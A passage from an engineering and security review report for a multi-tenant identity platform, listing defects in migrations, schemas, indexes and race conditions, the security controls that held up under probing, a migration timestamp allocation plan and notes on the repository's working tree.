**X3 (medium) — Migration replay order already differs from deployed order.** Migrations `20260825…`–`20260830…` are hand-named with dates ahead of the real clock. The deployed database shows `directory_writeback` (real timestamp `20260824020657`) applied **last**; a fresh `migrate deploy` replays it second-from-last. Today the two orders commute — verified file by file: the future-named migrations add govern tables, a constraint swap, one index and three `ADD COLUMN`s, none touching what `directory_writeback` alters.

The forward hazard is structural: the next migration `prisma migrate dev` generates carries a real timestamp that sorts **before** four migrations production already has, and it is diffed against a shadow database holding the full end state. If it references `OrgUnit.status`, `Tenant.additionalDomains` or `UpstreamIdp.allowLoginAdoption`, a fresh replay hits them before they exist. `migrationState()` compares name sets only, so the divergence is invisible to the readiness check.

**X4 (low) — No caching anywhere;** the pnpm store and Playwright Chromium are re-fetched every run.

Verified positively: a tag build runs both `test` and `e2e`; `db:generate` precedes typecheck; seed-after-migrations is exercised; the backgrounded `pnpm dev` survives across steps and is health-gated before Playwright starts.

---

## 9. Data layer and contracts

**B1 (medium) — Source schemas are not `.strict()`.** `createSourceRequest` and `updateSourceRequest` strip unknown keys, so a `PATCH` carrying a typoed `writebackPasword` alongside a valid field commits the valid one, answers success, and leaves password write-back on. `provision.ts` documents at length why its schemas are strict; the schemas carrying the security-relevant write-back flags never got the same treatment. `tenantSettingsRequest` and `patchUserRequest` share the gap. `contracts/sync.ts:46,86`

**B2 (medium) — The seed's idempotence guard tests the wrong thing.** `findFirst({ where: { login: 'admin' } })` after a slug upsert is satisfied by any leftover fixture — exactly what the integration suite leaves behind. `upsert.update: {}` also means a leftover `acme` with a wrong `primaryDomain` is kept as-is, so the seed can "succeed" against a tenant whose domain never matches. CI sidesteps it only because it calls `db:reset` first. `packages/db/src/seed.ts:59`

**B3 (medium) — `GroupMembership` has no index on `userId`.** The unique index leads with `groupId`, so the per-user lookup falls back to the bare `tenantId` index and filters the tenant's whole membership table — on every portal render, SAML assertion and OIDC token. `RoleAssignment` carries the index this table lacks. `schema.prisma:121-131`

**B4 (low) — Two documented one-per invariants have no backing constraint:** one `active` `SigningKey` per (tenant, kind), and one `TargetAccount` anchor per (target, anchor). Every comparable invariant in this schema uses a partial unique index. `schema.prisma:901-923,1275-1309`

**B5 (low) — Three response contracts are declared and used by nothing:** `mfaStatusResponse`, `applicationTile`, `ruleImpactResponse`. The API builds these responses by hand and the web types them locally, so the wire shape they exist to pin can drift silently.

---

## 10. What held up

Stated plainly, because the list above is long. Each was specifically probed.

- **Tenant isolation.** 99 of 101 tables carry `ENABLE` + `FORCE ROW LEVEL SECURITY` and a `tenant_isolation` policy — verified against the live database. The exceptions are `Tenant` (deliberate; pre-auth host resolution, no `tenantId`) and `_prisma_migrations`. Tables are owned by `syntra_app`, which is `NOSUPERUSER NOBYPASSRLS`, so FORCE binds the owner. The policy's `NULLIF(current_setting(...), '')::uuid` fails closed. No route takes a tenant id from a body or param. Core cannot construct a second Prisma client, and a boundary test enforces it.
- **Credentials.** Argon2id at OWASP minimums; a module-level dummy hash for unknown logins; reset tokens 32-byte random, SHA-256 at rest, single live token per user, consumed by conditional update with a row-count check, and the request path padded to a 250 ms floor.
- **Sessions.** Hashed at rest, scope-dependent idle and absolute expiry, and `isLive` re-reads user status on every resolve — so deactivation by admin, by directory write-back or by sync cuts existing sessions even where revocation was missed.
- **Second factors.** TOTP window ±1 with a timing-safe comparison and a replay watermark that is persisted, checked and advanced by conditional update whose count is verified. Recovery codes hashed, single-use, and never able to satisfy a named-factor requirement. WebAuthn RP ID pinned to the tenant's `primaryDomain`, never the Host header; counter regression refused; challenges single-use and consumed even on an unknown credential.
- **Rate limiting.** Verified against the library source that the guard throttles exactly when `current > max`; applied on every credential-presenting route before the Argon2 work; keyed per tenant and per IP, not attacker-resettable, and Host rotation cannot change the bucket.
- **SAML and OIDC.** XSW defended by re-parsing only `getSignedReferences()` bytes on both the IdP and upstream-SP sides; ACS allowlisted with refusals audited; redirect-binding signatures over the raw query with duplicated parameters refused; PKCE required for all clients; codes single-use and bound to client and redirect URI; refresh rotation on every use; post-logout redirects exact-matched.
- **The audit chain.** Genuinely verified, not recomputed against itself: each event's stored `prevHash` is checked against the running expected hash and its own digest recomputed, returning the offending sequence. Checkpointing cannot mask a break, and `audit_chain_broken` is deliberately outside the kinds a nightly build can auto-resolve.
- **Provisioning safety.** The three-step in-flight/intent/result shape survives a crash in any phase; no delete path exists at any layer, structurally tested; the guard fails closed on NaN, zero persons and missing denominators; connector credentials never reach audit rows, job payloads or logs; every LDAP bind unbinds in a `finally`.
- **Switch exhaustiveness.** The `break`-instead-of-`return` shape that `noFallthroughCasesInSwitch` was enabled for is absent everywhere it was hunted — provision, sync, govern and automate all return per case or carry a `never` check.

---

## 10b. Found during remediation, not during the review

**G28 — `upsertFindings` reads then creates, exactly as `detectSodViolations` did.**
`packages/core/src/govern/finding-service.ts:302` did `findUnique` then
`create` against `GovernFinding`'s `(tenantId, kind, subjectRefType,
subjectRefId)` unique index. Two detection passes over one tenant -- an
administrator pressing "Build snapshot" while the nightly job runs -- both read
null and both create; the second raises P2002, the job throws, and
`reconcileFindings` never runs.

This is the same defect as **G23** in a second table, and the review missed it
because it was looking at the SoD write. It surfaced only when G23's fix let the
two passes get further and collide here instead -- which is the argument against
fixing one half of a read-then-create: the failure mode is unchanged, one table
along. Fixed in remediation 2, task 8, by upserting on the key the read already
used.

**G29 — `buildDecisionGraph`'s cycle detection is the dominant cost, not the
laundering scan.** G11 said the laundering scan was O(decisions² × rules), and
it was; remediation 2, task 9 indexed it by pair. But measuring the fix turned
up a larger number beside it. On 4,000 edges over 400 people,
`packages/core/src/govern/graph.ts`'s `buildDecisionGraph` takes **24,730 ms
with zero SoD rules** and 25,547 ms with twenty — so the laundering scan is
0.8 s of it and cycle detection is the other 24.7 s. It is synchronous, it runs
inside `runSnapshotJob`, and 400 people is small: §17 calls a 50,000-person
population ordinary.

Not fixed. It is a different function from the one task 9 was scoped to, the
fix is a real algorithm change rather than an indexing change, and shipping it
untested inside a task about resource keys would be the wrong trade. The
laundering perf test in `graph.test.ts` measures rules-against-no-rules
precisely so it keeps testing task 9's fix and not this.

The general lesson is worth carrying into plans 3 and 4: **grep for
`findUnique` followed by `create` on the same natural key** rather than
treating each report as its own finding.

---

## 11. Migration timestamp allocation

The remediation plans were written in parallel and three of them independently
chose `20260831000000`. Migration directory names are hand-dated above the
floor (§8, X3), so they do not deconflict themselves. Blocks are allocated per
plan, ascending in execution order:

| Plan | Block | Migrations |
|---|---|---|
| 1 — Urgent | none | adds the floor check only |
| 2 — Governance | `20260831…` | `campaign_revocation_vocabulary` |
| 3 — Approvals & provisioning | `20260901…`, `20260902…` | `access_request_requested_starts_at`, `provision_drop_unread_columns` |
| 4 — Auth, API & console | `20260903…`, `20260904…` | `builtin_role_permissions`, `membership_index_and_one_per_uniques` |
| 5 — Update feature | `20260905…` | `deployment_manage_backfill` |
| — rehearsal fixtures | `20261001…`, `20261002…` | injected into a scratch release tarball, never committed |

A sixth plan, or a migration added outside these, takes the next free block
above `20260905000000`. `packages/db/src/migration-order.ts` (plan 1, task 5)
fails any migration named at or below `20260830000000`.

---

## 12. Working-tree note

Another session worked in this repository throughout the review, and the tree moved under it. What that means for the plans:

- **The password setup feature landed.** `ab21f4d`, `f694015`, `0922b64` and `a60c8a2` added its design and plan; `95ea0d5`, `4cb2223`, `b5a4fc7` and `4a8a12a` implemented it. The TDD red phase noted during the review is now green. Its completion path shares `completePasswordReset`, which is why H1 widened (see §7.4).
- **The three test fixes were committed by that session,** as `474567e`, not by this one. They are in `main` unchanged, so **task 1 of remediation plan 1 is already done** — verify and skip it rather than repeating it.
- **Do not assume a clean tree, and never `git add -A`.** Stage only the exact paths each task names.
